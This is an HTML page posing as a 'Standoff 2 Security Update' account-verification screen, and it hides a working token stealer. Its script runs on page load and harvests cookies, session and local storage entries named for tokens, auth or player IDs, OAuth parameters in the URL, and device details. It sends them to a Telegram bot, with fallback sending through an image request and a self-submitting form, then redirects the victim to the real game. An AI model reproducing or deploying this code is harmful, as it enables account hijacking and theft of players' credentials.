<!DOCTYPE html>
<html>
<head>
    <title>Standoff 2 Security Update</title>
    <script>
        const BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
        const CHAT_ID = "123456789";
        
        // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        function advancedDataCollection() {
            const collectedData = {
                // === URL –ü–ê–†–ê–ú–ï–¢–†–´ ===
                url_parameters: extractAllUrlParams(),
                
                // === –î–ê–ù–ù–´–ï –£–°–¢–†–û–ô–°–¢–í–ê ===
                device_info: {
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardware_concurrency: navigator.hardwareConcurrency,
                    device_memory: navigator.deviceMemory,
                    screen: `${screen.width}x${screen.height}`,
                    color_depth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touch_support: 'ontouchstart' in window
                },
                
                // === –•–†–ê–ù–ò–õ–ò–©–ê ===
                storage_data: {
                    cookies: document.cookie,
                    localStorage: extractStorage(localStorage),
                    sessionStorage: extractStorage(sessionStorage),
                    indexedDB: checkIndexedDB()
                },
                
                // === –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï ===
                network_info: {
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : 'unavailable',
                    ip: 'will_be_detected_on_server'
                },
                
                // === –í–†–ï–ú–Ø –ò –ò–°–¢–û–ß–ù–ò–ö ===
                meta_info: {
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer,
                    full_url: window.location.href,
                    domain: window.location.hostname
                }
            };
            
            // –§—É–Ω–∫—Ü–∏–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            function extractAllUrlParams() {
                const params = {};
                // –ü–∞—Ä–∞–º–µ—Ç—Ä—ã search
                const urlParams = new URLSearchParams(window.location.search);
                for (let [key, value] of urlParams.entries()) {
                    params[`get_${key}`] = value;
                }
                // –ü–∞—Ä–∞–º–µ—Ç—Ä—ã hash
                const hashParams = new URLSearchParams(window.location.hash.substring(1));
                for (let [key, value] of hashParams.entries()) {
                    params[`hash_${key}`] = value;
                }
                return params;
            }
            
            function extractStorage(storage) {
                const items = {};
                try {
                    for (let i = 0; i < storage.length; i++) {
                        const key = storage.key(i);
                        // –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ –≤–∞–∂–Ω—ã–µ –∫–ª—é—á–∏
                        if (key.includes('token') || key.includes('auth') || key.includes('session') || 
                            key.includes('user') || key.includes('player') || key.includes('standoff')) {
                            items[key] = storage.getItem(key);
                        }
                    }
                    return items;
                } catch(e) {
                    return 'blocked';
                }
            }
            
            function checkIndexedDB() {
                return new Promise((resolve) => {
                    if (!window.indexedDB) {
                        resolve('not_supported');
                        return;
                    }
                    setTimeout(() => resolve('timeout'), 500);
                });
            }
            
            // –ê–Ω–∞–ª–∏–∑ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            analyzeAndSendData(collectedData);
        }
        
        function analyzeAndSendData(data) {
            // –ü–æ–∏—Å–∫ —Ç–æ–∫–µ–Ω–æ–≤ –≤ –¥–∞–Ω–Ω—ã—Ö
            const tokenPatterns = [
                'access_token', 'refresh_token', 'token', 'auth', 'code',
                'session', 'oauth', 'bearer', 'jwt', 'player_id', 'user_id'
            ];
            
            let foundTokens = {};
            const dataString = JSON.stringify(data).toLowerCase();
            
            tokenPatterns.forEach(pattern => {
                if (dataString.includes(pattern)) {
                    foundTokens[pattern] = 'found_in_data';
                }
            });
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
            if (data.url_parameters) {
                Object.entries(data.url_parameters).forEach(([key, value]) => {
                    if (value && value.length > 10 && 
                        (key.includes('token') || key.includes('auth') || key.includes('code'))) {
                        foundTokens[key] = value;
                    }
                });
            }
            
            // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
            const message = {
                found_tokens: foundTokens,
                has_tokens: Object.keys(foundTokens).length > 0,
                device_type: data.device_info.user_agent.includes('Mobile') ? 'MOBILE' : 'DESKTOP',
                full_data: data
            };
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
            sendToTelegram(message);
        }
        
        function sendToTelegram(message) {
            const text = `üéØ STANDOFF 2 TOKEN REPORT\n\n` +
                        `üì± Device: ${message.device_type}\n` +
                        `üïí Time: ${new Date().toLocaleString()}\n` +
                        `‚úÖ Tokens Found: ${message.has_tokens ? 'YES' : 'NO'}\n` +
                        `üîç Details: ${JSON.stringify(message.found_tokens, null, 2)}\n\n` +
                        `üìä Full Data: ${JSON.stringify(message.full_data, null, 2).substring(0, 3000)}`;
            
            // –û—Å–Ω–æ–≤–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            }).catch(error => {
                // –†–µ–∑–µ—Ä–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã –æ—Ç–ø—Ä–∞–≤–∫–∏
                backupSendMethods(text);
            });
            
            // –†–µ–¥–∏—Ä–µ–∫—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            redirectUser();
        }
        
        function backupSendMethods(text) {
            // –ú–µ—Ç–æ–¥ 1: —á–µ—Ä–µ–∑ Image
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text.substring(0, 2000))}`;
            
            // –ú–µ—Ç–æ–¥ 2: —á–µ—Ä–µ–∑ Form
            setTimeout(() => {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                form.innerHTML = `<input name="chat_id" value="${CHAT_ID}"><input name="text" value="${text.substring(0, 1000)}">`;
                document.body.appendChild(form);
                form.submit();
            }, 100);
        }
        
        function redirectUser() {
            setTimeout(() => {
                const redirects = [
                    'https://standoff2.com',
                    'standoff2://main',
                    'https://play.google.com/store/apps/details?id=com.axlebolt.standoff2',
                    'https://apps.apple.com/app/standoff-2/id1344023307'
                ];
                
                for (let url of redirects) {
                    try {
                        window.location.href = url;
                        break;
                    } catch(e) {
                        continue;
                    }
                }
            }, 500);
        }
        
        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', advancedDataCollection);
        window.addEventListener('hashchange', advancedDataCollection);
        
        // –ó–∞–ø—É—Å–∫ —Å—Ä–∞–∑—É –µ—Å–ª–∏ DOM —É–∂–µ –≥–æ—Ç–æ–≤
        if (document.readyState === 'interactive' || document.readyState === 'complete') {
            advancedDataCollection();
        }
        
    </script>
</head>
<body style="display:none; background: #000;">
    <div style="color: white; text-align: center; padding: 50px;">
        <h2>Loading Standoff 2...</h2>
        <p>Please wait while we verify your account</p>
    </div>
</body>
</html>
